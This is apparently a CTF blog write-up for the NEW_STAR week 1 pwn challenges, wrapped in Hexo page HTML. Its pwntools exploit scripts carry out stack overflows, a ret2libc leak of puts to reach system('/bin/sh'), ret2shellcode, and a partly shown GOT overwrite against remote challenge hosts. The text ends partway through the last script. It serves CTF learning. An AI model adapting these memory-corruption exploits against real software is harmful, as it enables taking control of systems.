@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="PWN1from pwn import *  context(log_level&#x3D;&#39;debug&#39;) # io &#x3D; process(&#39;.&#x2F;pwn&#39;) io &#x3D; remote(&#39;node4j.buuoj.cn&#39;,29139)  offset &#x3D; 32+8 padding &#x3D; b&#39;A&#39;  vuln_addr &#x3D; 0x400708 pop_rdi &#x3D; 0x4007d3  # basic overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NEW_STAR-WEEK1-PWN">
+<meta property="og:url" content="http://kelpie.top/post/NEW_STAR%20Week1.html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="PWN1from pwn import *  context(log_level&#x3D;&#39;debug&#39;) # io &#x3D; process(&#39;.&#x2F;pwn&#39;) io &#x3D; remote(&#39;node4j.buuoj.cn&#39;,29139)  offset &#x3D; 32+8 padding &#x3D; b&#39;A&#39;  vuln_addr &#x3D; 0x400708 pop_rdi &#x3D; 0x4007d3  # basic overflow">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkZTyzdglzSACLiSSKjSW10Rbdt8.png">
+<meta property="article:published_time" content="2022-09-25T23:40:33.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.774Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="NEW_STAR">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkZTyzdglzSACLiSSKjSW10Rbdt8.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NEW_STAR-WEEK1-PWN</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/NEW_STAR%20Week2.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/%5BBUUCTF%5D%20PWN3.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/NEW_STAR%20Week1.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/NEW_STAR%20Week1.html&text=NEW_STAR-WEEK1-PWN"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/NEW_STAR%20Week1.html&is_video=false&description=NEW_STAR-WEEK1-PWN"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEW_STAR-WEEK1-PWN&body=Check out this article: http://kelpie.top/post/NEW_STAR%20Week1.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/NEW_STAR%20Week1.html&name=NEW_STAR-WEEK1-PWN&description=&lt;h2 id=&#34;PWN1&#34;&gt;&lt;a href=&#34;#PWN1&#34; class=&#34;headerlink&#34; title=&#34;PWN1&#34;&gt;&lt;/a&gt;PWN1&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
+
+context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;# io = process(&#39;./pwn&#39;)&lt;/span&gt;
+io &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4j.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29139&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+offset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;
+padding &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;
+
+vuln_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x400708&lt;/span&gt;
+pop_rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x4007d3&lt;/span&gt;
+
+&lt;span class=&#34;token comment&#34;&gt;# basic overflow&lt;/span&gt;
+payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; padding&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;offset  &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vuln_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;?\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/NEW_STAR%20Week1.html&t=NEW_STAR-WEEK1-PWN"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1"><span class="toc-number">1.</span> <span class="toc-text">PWN1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN2-calc"><span class="toc-number">2.</span> <span class="toc-text">PWN2 calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN3-ret2libc"><span class="toc-number">3.</span> <span class="toc-text">PWN3 ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN4-ret2shellcode"><span class="toc-number">4.</span> <span class="toc-text">PWN4 ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN5"><span class="toc-number">5.</span> <span class="toc-text">PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN5-Reference"><span class="toc-number">5.1.</span> <span class="toc-text">PWN5 Reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NEW_STAR-WEEK1-PWN
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-25T23:40:33.000Z" class="dt-published" itemprop="datePublished">2022-09-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="p-category" href="/tags/NEW-STAR/" rel="tag">NEW_STAR</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token comment"># io = process('./pwn')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4j.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29139</span><span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> <span class="token number">32</span><span class="token operator">+</span><span class="token number">8</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+
+vuln_addr <span class="token operator">=</span> <span class="token number">0x400708</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x4007d3</span>
+
+<span class="token comment"># basic overflow</span>
+payload <span class="token operator">=</span> padding<span class="token operator">*</span>offset  <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span id="more"></span>
+
+<h2 id="PWN2-calc"><a href="#PWN2-calc" class="headerlink" title="PWN2 calc"></a>PWN2 calc</h2><p>basic python script programming.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>operator<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ans <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>operator <span class="token operator">==</span> <span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ans <span class="token operator">=</span> a <span class="token operator">+</span> b
+    <span class="token keyword">elif</span><span class="token punctuation">(</span>operator <span class="token operator">==</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ans <span class="token operator">=</span> a <span class="token operator">-</span> b
+    <span class="token keyword">elif</span><span class="token punctuation">(</span>operator <span class="token operator">==</span> <span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ans <span class="token operator">=</span> a <span class="token operator">*</span> b
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        ans <span class="token operator">=</span> a <span class="token operator">/</span> b
+    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># o = process('./calc')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29226</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    str_val <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" = what?\n"</span><span class="token punctuation">)</span>
+    str_list <span class="token operator">=</span> str_val<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>str_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>str_list<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    operator <span class="token operator">=</span> str_list<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    val <span class="token operator">=</span> calc<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>operator<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>val<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="PWN3-ret2libc"><a href="#PWN3-ret2libc" class="headerlink" title="PWN3 ret2libc"></a>PWN3 ret2libc</h2><p>Replace the env</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">patchelf --replace-needed libc.so.6 ./libc-2.31.so ./pwn
+patchelf --set-interpreter ./ld-2.31.so ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/home/kali/Desktop/new_star/pwn2/ld-2.31.so'</span><span class="token punctuation">,</span><span class="token string">'./pwn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">'/home/kali/Desktop/new_star/pwn2/libc-2.31.so'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+<span class="token comment"># io = remote('node4.buuoj.cn',25158)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>
+
+context<span class="token punctuation">(</span>arch <span class="token operator">=</span> elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">40</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+
+main_addr <span class="token operator">=</span> <span class="token number">0x400698</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x400753</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x40050e</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+<span class="token comment"># gdb.attach(io,'b *0x400530')</span>
+
+payload <span class="token operator">=</span> padding <span class="token operator">*</span> offset<span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> offset <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">=</span> offset<span class="token operator">*</span>padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> padding<span class="token operator">*</span><span class="token number">8</span>
+<span class="token comment"># payload1 = flat([padding*offset, ret_addr, pop_rdi,str_bin_sh,system_addr, 0xdeadbeef])</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token comment"># io.sendlineafter("time?\n",payload1)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="PWN4-ret2shellcode"><a href="#PWN4-ret2shellcode" class="headerlink" title="PWN4 ret2shellcode"></a>PWN4 ret2shellcode</h2><p>Ezez..</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment"># io = process('./pwn4')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27632</span><span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> <span class="token string">'I'</span>
+offset <span class="token operator">=</span> <span class="token number">20</span>
+addr <span class="token operator">=</span> <span class="token number">0x08048f13</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>padding<span class="token operator">*</span>offset<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span> addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">patchelf --replace-needed libc.so.6 ./libc-2.31.so ./pwn
+patchelf --set-interpreter ./ld-2.31.so ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Leak the puts function address.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkZTyzdglzSACLiSSKjSW10Rbdt8.png"></p>
+<p>If we change puts function to system function, and we can getshell.<br>What should we do? What operations we can take?</p>
+<ol>
+<li>In the scanf function, we have to pass the address.</li>
+<li>We can read something in buf</li>
+</ol>
+<p>Let’s organize ideas</p>
+<ol>
+<li>leaking the puts address -&gt; according to libc -&gt; find the system adress and &#x2F;bin&#x2F;sh address</li>
+<li>change the put_got address</li>
+<li>when system call puts function -&gt; put_got address -&gt; real put function address</li>
+</ol>
+<p>So we can change the real put function address by the read function.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token comment"># io= process('pwn5')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27112</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn5'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+
+info<span class="token punctuation">(</span><span class="token string">"PUTS_GOT == %s "</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"PUTS_GOT_ORIGINAL == %s"</span> <span class="token operator">%</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
